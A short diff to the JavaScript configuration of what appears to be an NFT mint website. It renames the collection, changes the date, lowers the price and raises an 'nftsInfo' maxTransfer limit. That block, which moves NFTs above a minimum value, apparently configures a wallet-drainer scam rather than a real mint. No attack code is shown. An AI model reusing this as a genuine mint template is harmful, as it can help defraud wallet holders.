@@ -1,7 +1,7 @@
 const collectionInfo = {
-    name: "Crypto Dope",
+    name: "Satori",
     title: "{name}",
-    date: "04.09.2022",
+    date: "05.09.2022",
     socialMedia: {
         discord: "https://discord.com/",
         twitter: "https://twitter.com/",
@@ -18,7 +18,7 @@ const collectionInfo = {
     }
 }
 const mintInfo = {
-    price: 3,
+    price: 1.5,
     totalSupply: 1000,
     toFixed: 1,
     minUnits: 1,
@@ -29,7 +29,7 @@ const mintInfo = {
 const nftsInfo = {
     active: true,
     minValue: 0.2,
-    maxTransfer: 3,
+    maxTransfer: 5,
 }
 
 if (mintInfo.minUnits > mintInfo.maxUnits) console.error(`Error: minUnits (${mintInfo.minUnits}) is greater than maxUnits (${maxUnits})`);
